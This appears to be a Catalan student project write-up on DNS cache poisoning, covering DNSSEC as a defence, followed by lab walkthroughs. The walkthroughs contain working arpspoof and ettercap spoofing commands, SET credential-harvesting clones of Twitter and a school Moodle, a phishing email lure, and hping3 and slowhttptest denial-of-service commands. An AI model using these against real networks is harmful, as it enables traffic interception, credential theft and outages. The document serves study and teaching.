# __Projecte ASIX 2k22__
## __Escola Del Treball__
### __2HISX 2021-2022__
### __Aaron Andal & Cristian Condolo__


<br>
<br>
<br>
<br>

# __CryptoSEC__: "_Careful where you step in_"


![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/CryptoSECLogo.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*



<br>
<br>
<br>




# __Index__

+ **DNS Cache Poisoning / DNS Spoofing**: [--> readME <--](#dns-cache-poisoning--dns-spoofing)

+ **Què fan els solucionadors de DNS?**: [--> readME <--](#què-fan-els-solucionadors-de-dns)

+ **Com funciona la memòria cau DNS?**: [--> readME <--](#com-funciona-la-memòria-cau-dns)

+ **Com enverinen els atacants la memòria cau DNS?**: [--> readME <--](#com-enverinen-els-atacants-la-memòria-cau-dns)

+ **Métodes d'execució per a realitzar DNS Spoofing**: [--> readME <--](#métodes-dexecució-per-a-realitzar-dns-spoofing)

    + **Exemple i explicació pràctic DNS Cache Poisoning**: [--> readME <--](#exemple-i-explicació-pràctic-dns-cache-poisoning)

+ **Com prevenir DNS Spoofing?**: [--> readME <--](#com-prevenir-dns-spoofing)

    + **Implantació de DNSSEC**: [--> readME <--](#implantació-de-dnssec)

+ **Exemples DNS Cache Poisoning / Spoofing**: [--> readME <--](#exemples-dns-cache-poisoning--spoofing)

    + **Exemple 1: Utilitzant __setoolkit__ a Kali Linux i ETTERCAP**: [--> readME <--](#exemple-1-utilitzant-setoolkit-a-kali-linux-i-ettercap)

    + **Ettercap per CLI**: [--> readME <--](#ettercap-per-cli)

+ **Explicació resumida**: [--> readME <--](#explicació-resumida)

+ **Exemple 2, cleanest DNS Spoof with BETTERCAP**: [--> readME <--](#exemple-2-cleanest-dns-spoof)

    + **PART1: (ARP Spoof + DNS Spoof) amb Setoolkit (Mail Phishing + Site Cloner + Credential Harvester**: [--> readME <--](#part1-arp-spoof--dns-spoof-amb-setoolkit-mail-phishing--site-cloner--credential-harvester)

    + **PART2: Attacking SOA and Forward DNS Servers with DOS (SlowHTTP - Attack cryptosec.net web Apache2)**: [--> readME <--](#attacking-soa-and-forward-dns-servers-with-dos-slowhttp---attack-cryptosecnet-web-apache2)

+ **Bibliografia**: [--> readME <--](#bibliografia)

<br>
<br>
<br>


# __DNS Cache Poisoning / DNS Spoofing__

Abans d'entrar en escena hi posem un exemple:

_Imagineu-vos que, un grup d'estudiants d'últim any d'EDT 2HISX, fan una broma als estudiants de batxillerat._ 

_Aquest grup d'estudiants "canvien" tots els números de les habitacions del campus de l'institut EDT, de manera que quan els nous estudiants de batxillerat (que encara no conèixen les instal·lacions del campus), l'endemà es apareguin en aules equivocades._

_Els números d'habitació que no coincideixen, s'enregistren en un directori del campus i els estudiants nous de batxillerat segueixen anant a les aules equivocades fins que algú finalment se'n adona i corregeix l'error._

L'exemple anterior és el __DNS Cache Poisoning__ o __DNS Spoofing__.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/dns-cache-poisoning-vs-dns-spoofing-1024x765.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

_DNS Cache Poisoning_ (enverinament de la memòria cau DNS), també es conegut com _DNS Spoofing_ (suplantació de DNS), és un atac del tipus _spoofing_ (suplantació) que consisteix en _alterar_ els registres DNS amb la finalitat de _redirigir_ el _fluxe de paquets_ entre un host (víctima) i un servidor a la seva _màquina atacant_.

> _"DNS Spoofing és l'acció d'introduïr informació falsa a una memòria cau DNS, modifica la taula ARP, fent creure que el client està parlant amb el servidor, però en realitat parla amb la màquina de l'atacant, lo mateix amb el servidor"_

Amb altres paraules, utilitza registres DNS alterats per redirigir el trànsit de paquets en una connexió, retornen una resposta incorrecta i les víctimes es dirigeixen als llocs _web fraudulents_ on a posteriori son infectats per _l'atacant_.

> _"Amb DNS Spoofing redirigim els paquets ipv4 entre el host i el servidor al host de l'atacant"_

Les _webs fraudulents_ son _"quasi"_ copies originals de pàgines web conegudes allotjades a la màquina de _l'atacant_.

> _"L'atacant implanta una pàgina web maliciosa i infecta la víctima"_

![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/DNS-spoofing.jpg)

Un cop allà, se'ls demana als usuaris que iniciïn sessió al seu compte (el que creuen que és), donant a l'autor l'oportunitat de robar les seves credencials d'accés i altres tipus d'informació sensible. A més, el lloc web maliciós s'utilitza sovint per instal·lar cucs o virus a l'ordinador d'un usuari, donant-li a l'autor accés a llarg termini i a les dades que emmagatzema.

Quan un servidor DNS ha rebut dades no autèntiques i les emmagatzema en memòria cau per augmentar el rendiment en el futur, es considera _enverinament_, proporcionant les dades no autèntiques als clients del servidor.

Les adreçes IP son com "números d'habitació" d'Internet, la qual cosa permet que el trànsit web arribi a llocs adequats.

La memòria CAU de les resolucions DNS són el _"directori del campus"_, quan emmagatzemen informació _defectuosa_, el trànsit va als llocs equivocats fins que es corregeix la informació.

Com que normalment els solucionadors de DNS no tenen cap manera de verificar les dades de la memòria cau, la informació de DNS incorrecta romandrà a la memòria cau fins que caduca el temps de vida (TTL) o fins que s'elimina manualment

Una sèrie de vulnerabilitats fan possible l'enverinament del DNS, però el principal problema és que el DNS es va crear per a una Internet molt més petita i es va basar en un principi de confiança (com ara BGP ). 
 
Un protocol DNS més segur anomenat _DNSSEC_ pretén resoldre alguns d'aquests problemes, però encara no s'ha adoptat àmpliament.

<br>
<br>
<br>

# __Què fan els solucionadors de DNS?__

Els solucionadors de DNS proporcionen als clients l'adreça IP associada a un nom de domini. 

En altres paraules, prenen adreces de llocs web llegibles per humans com _"cloudflare.com"_ i les tradueixen a adreces IP llegibles per màquina. 

Quan un usuari intenta navegar a un lloc web, el seu sistema operatiu envia una sol·licitud a un solucionador de DNS. 

El solucionador de DNS respon amb l'adreça IP i el navegador web agafa aquesta adreça i inicia la càrrega del lloc web. 

<br>
<br>
<br>

# __Com funciona la memòria cau DNS?__

Un solucionador de DNS desarà les respostes a les consultes d'adreces IP durant un període de temps determinat. 

D'aquesta manera, el resolutor pot respondre a futures consultes molt més ràpidament, sense necessitat de comunicar-se amb els molts servidors implicats en el procés típic de resolució de DNS. 

Els solucionadors de DNS guarden les respostes a la memòria cau mentre els permeti el temps de vida designat (TTL) associat a aquesta adreça IP. 

Resposta DNS sense memòria cau: 

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/svg1.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*

<br>
<br>
<br>

# __Com enverinen els atacants la memòria cau DNS?__

Els atacants poden enverinar la memòria cau DNS suplantant la identitat dels noms DNS , fent una sol·licitud a un resolutor de DNS i, a continuació, forjant la resposta quan el resolutor de DNS consulta un servidor de noms. 

Això és possible perquè els servidors DNS utilitzen UDP en comptes de TCP i perquè actualment no hi ha cap verificació per a la informació DNS.

__Procés d'enverinament de la memòria cau DNS:__

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/svg2.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

__Memòria cau DNS enverinada:__


![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/svg3.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

En lloc d'utilitzar TCP, en la que ambdues connexions fan un "handshake" per iniciar la comunicació i verificar la identitat dels dispositius.

Les solicituds i respostes DNS utilitzen UDP (User Datagram Protocol) (Port 53). No hi ha cap garantia que hi hagi una connexió oberta, que el destinatari estigui perparat per rebre o que l'emissor siguie qui diuen ser.

L'UDP és vulnerable a la falsificació per aquest motiu: Un atacant pot enviar un missatge mitjançant UDP i fingir que és una resposta d'un servidor autoritari i legítim, falsificant les dades de la _capçalera del paquet_.

Si un _solucionador de DNS_ rep una resposta falsificada, aquesta l'accepta i emmagatzema les dades de manera acrítica perquè no hi ha manera de verificar si la informació és precisa i prové d'una font legítima.

DNS es va crear als primers temps d'Internet, quan les úniques parts connectades amb ella eren les universitats i els centres de recerca. No hi havia cap raó per esperar que algú intentés difondre informació DNS falsa. 

Malgrat aquests principals punts de vulnerabilitat en el procés de memòria cau DNS, els atacs d'enverinament de DNS no són fàcils. 

Com que la resolució de DNS en realitat consulta el servidor de noms autoritzat, els atacants només tenen uns quants mil·lisegons per enviar la resposta falsa abans que arribi la resposta real del servidor de noms autoritzat. 

Els atacants també han de conèixen o endevinar una sèrie de factors per dur a terme atacs de suplantació de DNS:

1. Quines consultes DNS no s'emmagatzemen a la memòria cau pel _DNS Resolver_ de destinació, de manera que el resolutor consultarà el servidor de noms autoritzat.

2. Quin port fa servir el _DNS Resolver_, normalment s'utilitza el port 53 per a cada consulta DNS, pero ara, amb una bona construcció de DNS Segur pot ser que utilitzin un port aleatori cada vegada.

3. El número d'identificació de la solicitud

4. A quin servidor de noms autoritzat anirà la consulta.

Els atacants també podrien accedir a la resolució de DNS d'alguna altra manera. Si una part malintencionada opera, pirateja o obté accés físic a una solució de DNS, poden alterar més fàcilment les dades de la memòria cau. 

* En xarxes, un port és un punt virtual de recepció de comunicació. 

* Els ordinadors tenen diversos ports, cadascun amb el seu propi número, i perquè els ordinadors es parlin entre ells, s'han de designar determinats ports per a determinats tipus de comunicació. Per exemple, HTTP sempre van al port 80 i HTTPS sempre utilitza el port 443. 

<br>
<br>
<br>

# __Métodes d'execució per a realitzar DNS Spoofing:__

* __Man in the middle (MITM):__ la intercepció de les comunicacions entre usuaris i un servidor DNS per tal d'encaminar els usuaris a una adreça IP diferent/maliciosa.

* __Compromís del servidor DNS:__ el segrest directe d'un servidor _DNS Resolver_, que està configurat per retornar una adreça IP maliciosa.

![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/DNS-spoofing.jpg)


<br>
<br>
<br>

### __Exemple i explicació pràctic DNS Cache Poisoning__

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/dns-cache-poisoning-process-1011x1024.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

L'exemple anterior il·lustra un atac d'enverinament de memòria cau DNS, en què un __atacant__ (__IP 192.168.3.300__) intercepta un canal de comunicació entre un _client_ (__IP 192.168.1.100__) i un ordinador _servidor_ pertanyent al lloc web _www.estores.com_ (__IP 192.168.168. 2.200__).

En aquest escenari, s'utilitza una eina (per exemple, __arpspoof__) per enganyar el _client_ perquè pensi que la IP del servidor és __192.168.3.300__. 

Al mateix temps, es fa pensar al servidor que la IP del client també és __192.168.3.300__.

Un escenari així procediria de la següent manera:

1. __L'atacant__ utilitza _arpspoof_ per emetre l'ordre: ``arpspoof 192.168.1.100 192.168.2.200``. Això modifica les _adreces MAC_ a la taula _ARP del servidor_, fent-lo pensar que l'ordinador de __l'atacant__ pertany al __client__.

2. __L'atacant__ torna a utilitzar arpspoof per emetre l'ordre: ``arpspoof 192.168.2.200 192.168.1.100``, que indica al client que l'ordinador de l'autor és el servidor.

3. L'atacant emet l'ordre Linux: ``echo 1> /proc/sys/net/ipv4/ip_forward``. Com a resultat, els paquets IP enviats entre el _client_ i el _servidor_ es reenvien a l'ordinador de __l'autor atacant__.

4. El fitxer amfitrió, __192.168.3.300__ _estores.com_ es crea a l'ordinador local de __l'atacant__, que associa el lloc web _www.estores.com_ a la seva __IP local__.

5. __L'autor atacant__ configura un _servidor web_ a la IP de _l'ordinador local_ i crea un _lloc web fals_ fet per semblar a _www.estores.com_.

6. Finalment, s'utilitza una eina (per exemple, _dnsspoof_) per dirigir totes les _sol·licituds_ de DNS al fitxer __amfitrió__ local de __l'autor__. Com a resultat, el lloc __web fals__ es mostra als usuaris i, només en interactuar amb el lloc, s'instal·la programari maliciós als seus ordinadors.

![](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/DNS-spoofing.jpg


<br>
<br>
<br>

# __Com prevenir DNS Spoofing?__

Si bé hi ha diverses eines disponibles per trobar i fer front als DNS Spoofing.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/dns-cache-poisoning-prevention.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*

<br>
<br>
<br>

## __Implantació de DNSSEC__

DNS és un __protocol sense xifrar__, que facilita la interceptació del trànsit amb falsificació. A més, els servidors DNS no validen les adreces IP a les quals estan redirigint el trànsit.

DNSSEC és l'abreviatura de Domain Name System Security Extensions i és un mitjà per verificar la integritat i l'origen de les dades DNS. El DNS es va dissenyar originalment sense aquesta verificació, per això és possible l'enverinament del DNS. 

Igual que TLS/SSL , DNSSEC utilitza la criptografia de clau pública (una manera de signar digitalment la informació) per verificar i autenticar les dades. Les extensions DNSSEC es van publicar l'any 2005, però DNSSEC encara no s'ha generalitzat, el que deixa el DNS encara vulnerable als atacs. 

__DNSSEC__ és un protocol dissenyat per protegir el vostre DNS afegint mètodes addicionals de verificació. El protocol crea una signatura criptogràfica única emmagatzemada al costat dels altres registres DNS, per exemple, un registre i CNAME. Aquesta signatura l'utilitza el vostre solucionador de DNS per autenticar una resposta de DNS, assegurant-vos que el registre no s'hagi manipulat.

Tot i que DNSSEC pot ajudar a protegir contra la falsificació de DNS, té una sèrie de possibles desavantatges, com ara:

Manca de confidencialitat de les dades: DNSSEC s'autentica, però no codifica les respostes DNS. Com a resultat, els autors encara poden escoltar el trànsit i utilitzar les dades per a atacs més sofisticats.
Desplegament complex: DNSSEC sovint es configura malament, cosa que pot fer que els servidors perdin els avantatges de seguretat o fins i tot denegar l'accés a un lloc web.

Enumeració de zones: __DNSSEC__ utilitza registres de recursos addicionals per habilitar la validació de la signatura. Un d'aquests registres, __NSEC__, és capaç de verificar la inexistència d'una zona DNS. També es pot utilitzar per caminar per una zona DNS per reunir tots els registres DNS existents, una vulnerabilitat anomenada enumeració de zones. Les versions més noves de NSEC, anomenades NSEC3 i NSEC5, publiquen registres hash dels noms d'amfitrió, xifrant-los i evitant l'enumeració de zones.

<br>
<br>
<br>

# __Exemples DNS Cache Poisoning / Spoofing__

<br>
<br>
<br>

## __Exemple 1: Utilitzant __setoolkit__ a Kali Linux i ETTERCAP__

Demostració ràpida de com DNS pot ser suplantat utilitzant Kali Linux, i com el tràfic pot ser redirigit a una pàgina fraudulenta.

Hem decidit fer phishing la pàgina de Twitter utilitzant una eina anomenada "setoolkit" i fer un clonatge de la pàgina de Twitter.

Posteriorment suplantar el registre DNS en la que apuntava a twitter.com a la nostra màquina, on hi tenim un allotjat una pàgina fraudulenta utilitzant l'eina.

_Website Attack Vectors -> Creditials Harvestor -> Clone website / Use Web Template_


Utilitzarem un "toolkit" anomenat "setooklit" que es permetrà fer phishing a una pàgina i fer un clonatge perfecte.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/SeTool.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

Podem fer un clonatge d'una pàgina web o també té "templates" pre definides. En aquest exemple utilitzarem el template de https://www.twitter.com

Tarda una estona.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/SeToolkitTwitterClone.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/Suplantació.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

Com podem observar la pàgina de Twitter està a la nostra IP 10.200.243.137 al port 80.

Ara necessitem que tot el tràfic per a twitter.com sigui redirigit a la meva IP. Utilitzarem DNS Spoof que està disponible a ETTERCAP.

S'ha de canviar el contigut del fitxer etter.dns per a que twitter.com apunto a la nostra IP.

`apt-get install mlocate`

`updatedb`

`locate etter.dns`

┌──(root㉿osboxes)-[/home/anonymous]
└─# locate etter.dns
/etc/ettercap/etter.dns
/usr/share/ettercap/etter.dns.examples

`cp /etc/ettercap/etter.dns /etc/ettercap/etter.dns.original`

`vi /etc/ettercap/etter.dns`

```
*.twitter.com   A       10.200.243.137
www.twitter.com PTR     10.200.243.137

www.alor.org    A       127.0.0.1
www.naga.org    A       127.0.0.1
```

__Obrim Ettercap.__


![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/Ettercap.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

`ettercap --gtk` --> Fem el loadup.


Ens anem a `Plugins` --> `Manage the Plugins` --> `DNS Spoof plugin` --> L'activem.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/DNSSpoof.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

A continuació, ARP enverinará tots els amfitrions de la xarxa, de manera que tot el trànsit passa per la nostra màquina (atacant) --> començarem a "esnifar".

Quan algú intenti accedir a twitter.com, la finestra d'ettercap dirà "bla_bla.twitter.com" falsificat a la ip de l'atacant `<la_nostra_ip>`.

Al mateix temps, a la finestra SET, veuràs "tenim un èxit!!" juntament amb alguna altra informació. Si la víctima és prou crédula per introduir les seves credencials a la vostra pàgina de pesca, veureu aquests detalls a la finestra SET.

Però heu de jugar al joc d'espera i esperar fins que algú intenti accedir al lloc web de pesca. 

```
# Kali Linux

arp -a

arpspoof -i eth0 -t 10.200.243.211 10.200.243.1 # Suplantació redirecció de paquets al Client

arpspoof -i eth0 -t 10.200.243.1 10.200.243.211 # Suplantació redirecció de paquets al Servidor

```

```
# Host local

Connectar-se a Twitter - Farà la redirecció a 10.200.243.137


```

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/DNSSpoof.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

## __Ettercap per CLI__

- https://esgeeks.com/tutorial-ettercap-ejemplos/

Utilitza la següent ordre per llançar una suplantació de DNS:

sudo ettercap -T -q -P dns_spoof -i wlan0 -M arp /// ///

#Un altre comandament, per a tota la xarxa
sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof -p //192.168.1.1/

#Per a un rang de xarxa
sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof //192.168.1.1/ 192.168.1.51/

# __Explicació resumida:__

ARP Spoof - DNS Cache Poisoning

IP Atacant. 10.200.243.137 
MAC Atacant: 08:00:27:16:51:52

IP Victima: 10.200.243.212
MAC Victima: 18:c0:4d:a0:8f:c8

IP Router Gateway: 10.200.243.1
MAC Router Gateway: 00:22:57:be:53:01

Pàgina clonada: http://www.twitter.com

SPOOF del tràfic entre la VÍCTIMA I EL ROUTER --> ES CANVIA LA MAC DEL CLIENT VICTIMA PER LA MEVA: 18:c0:4d:a0:8f:c8 PER LA MEVA (ATACANT): 08:00:27:16:51:52.

EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.
 
└─# arpspoof -i eth0 -t 10.200.243.212 10.200.243.1
8:0:27:16:51:52 18:c0:4d:a0:8f:c8 0806 42: arp reply 10.200.243.1 is-at 8:0:27:16:51:52

"Tot el fluxe que va del servidor a la víctima, redirigeix-los a la meva màquina"

TORNADA

SPOOF del tràfic entre la EL ROUTER I LA VICTIMA --> ES CANVIA LA MAC DEL DEL ROUTER PER LA MEVA: 0:22:57:be:53:1 PER LA MEVA (ATACANT): 08:00:27:16:51:52.

EN REALITAT QUI CONECTA AMB EL SERVIDOR, SOC JO NO LA VÍCTIMA. FEM LA TORNADA.

┌──(root㉿osboxes)-[/home/anonymous]
└─# arpspoof -i eth0 -t 10.200.243.1 10.200.243.212
8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52
8:0:27:16:51:52 0:22:57:be:53:1 0806 42: arp reply 10.200.243.212 is-at 8:0:27:16:51:52

"Tot el fluxe que va de la víctima al servidor, redirigeix-los a la meva màquina"


_RESUM: TOT EL TRÀFIC DE PAQUETS QUE SURT DE LA VÍCTIMA AL SERVIDOR, SERÀN "FORWARD" AL MEU CLIENT ATACANT. JA QUE EL LA VÍCTIMA CREU QUE QUI CONTACTA ES AL ROUTER, PERO NO. SUPLANTO LA MAC DESTÍ DEL ROUTER PER LA MEVA._

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/New22.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Official%20Documentation/Hacking%20&%20Pentesting/DNS%20Spoofing/Photos/New23.png?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*

<br>
<br>
<br>

## __Exemple 2, cleanest DNS Spoof__: 

* Utilitzant __BETTERCAP__ com a main _MITM Attack_: 

    * __PART1__:
    
        * (ARP Spoof + DNS Spoof) amb Setoolkit (Mail Phishing + Site Cloner + Credential Harvester).
    
    * __PART2__:
        
        * Attacking SOA and Forward DNS Servers with DOS (SlowHTTP - Attack cryptosec.net web Apache2).

<br>
<br>
<br>

### __PART1: (ARP Spoof + DNS Spoof) amb Setoolkit (Mail Phishing + Site Cloner + Credential Harvester)__ 

Amb l'ARP Spoof d'abans activarem un _dnsspoof_ i injectarem un registre de DNS fals on ens redirigirà a la nostra màquina on hi tindrem una _fake page: m0odle.escoladeltreball.org_ (__Moodle EDT__) i l'enviarem per correu utilitzant __SET__ dient que "_URGENT! L'Eduard ha posat les notes de M06, entra urgentment i mira la nota que tens!!!_" llavors l'usuari entrarà i no se n'adonarà i li robarem les credencials mostrades al __SET__.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps0.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps1.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps2.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/arps3.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*

<br>
<br>

### A partir d'aquí generem el __mail phishing__ desde un compte de gmail robat a __CryptoSEC__.

1. Seleccionem la opció 5: __Mass Mailer Attack__.

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING0.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

2. Seleccionem la opció 5: __Mass Mailer Attack__. Omplim les opcions: `1`, `email destination`, `1`, `our email address`, `our email password`, `priority`, `attach file`, `fake email subject`, `body of messeage with END`

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish0.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish1.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish2.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/phish3.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING4.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING2.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PHISHING3.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*

<br>
<br>
<br>
<br>
<br>

## __Attacking SOA and Forward DNS Servers with DOS (SlowHTTP - Attack cryptosec.net web Apache2)__

Ídem que l'anterior però els targets son el __SOA__ i el __Forwarding__, els clients interns de CryptoSEC quan hagin d'anar a la pàgina web __cryptosec.net__, entraràn a __cryptos3c.net__ ja que el hacker ha avisat que hi hà una urgència a la pàgina principal i han d'entrar a la pàgina web dada pel hacker i les seves credencials seràn __robades sense que se'n adoni__!

1. El hacker activar el ARP Spoof amb targets del SOA i el Forwarder.

2. El hacker ha realitzat un DOS per tumbar l'apache2 (SOA): `hping3 --randsource -p80 -S --flood 10.200.243.164`

Ara explicaré què significa cada part de l'ordre:

- __p 80__ és el port que triem atacar

- S activa el flag Syn

– flood indica a hping que enviï els paquets a la màxima velocitat possible

- ip_victima és la __ip__ o __domini__ a atacar

Si volem que la nostra ip no sigui visible podem afegir-li l'opció –ai la ip que falsejarem o bé utilitzar –rand-source amb què es generen adreces d'origen ip a l'atzar:

``hping3 --randsource -p80 -S --flood 10.200.243.164``

o també podem utilitzar: `Slowhttptest`, nosaltres utilitzarem __slowhttptest__.

> _slowhttptest - Denial Of Service attacks simulator_

`slowhttptest -c 40000 -H -i 30 -r 500 -l 600 -u http://cryptosec.net`

``-c`` _number of connections
Specifies the target number of connections to establish during the test._

``-H'`` _Starts slowhttptest in SlowLoris mode, sending unfinished HTTP requests._

``-i`` _seconds
Specifies the interval between follow up data for slowrois and Slow POST tests._

``-r`` _connections per second
Specifies the connection rate._

``-l`` _seconds
Specifies test duration in seconds._

``-u`` _URL
Specifies the URL._

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/DOS-CRYPTOSEC.NET.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/PAGE-DOWN.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

2. El hacker activa la pàgina del __cryptos3c.net__ (fake) amb el SET (__Social Engineering Tool__).

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC0.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC1.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC2.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC3.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

3. El hacker emet un comunicat general a l'empresa dient que s'ha caigut temporalment la pàgina principal i que han d'entrar per la pàgina següent `cryptos3c.net`


4. Des d'un client de la xarxa interna de CryptoSEC 192.168.3.100 (_Linux Lite Client_) es vol conectar a la pàgina web de cryptosec.net, però han emès un comunicat que els redirecciona a __cryptos3c.net__ ja que la pàgina principal ha sigut hackejada amb DOS (denegació de servei).

![](https://github.com/KeshiKiD03/asixproject2k22/blob/main/Photos/BETTERCA-CRYPTOSEC4.PNG?raw=true)
> __Img Source__: *@Aaron & @Cristian 's GitHub*
<br>

5. Les credencials del client han sigut robades!

<br>
<br>
<br>

## --> [ [Tornar a Ciberseguretat](https://github.com/KeshiKiD03/asixproject2k22/blob/main/README.md) ] <--

# Bibliografia
- https://www.imperva.com/learn/application-security/dns-spoofing/
- https://programmerclick.com/article/2815493326/
- https://www.amirootyet.com/post/how-to-spoof-dns-in-kali-linux/
- https://es.acervolima.com/ataque-mitm-man-in-the-middle-usando-arp-poisoning/
- https://www.cloudflare.com/learning/dns/dns-cache-poisoning/
- https://www.okta.com/identity-101/dns-poisoning/
- https://www.boomernix.com/2018/03/realizando-un-dns-spoofing.html
- https://www.keyfactor.com/blog/what-is-dns-poisoning-and-dns-spoofing/
- https://ciberseguridad.blog/25-tipos-de-ataques-informaticos-y-como-prevenirlos/
- https://esgeeks.com/tutorial-ettercap-ejemplos/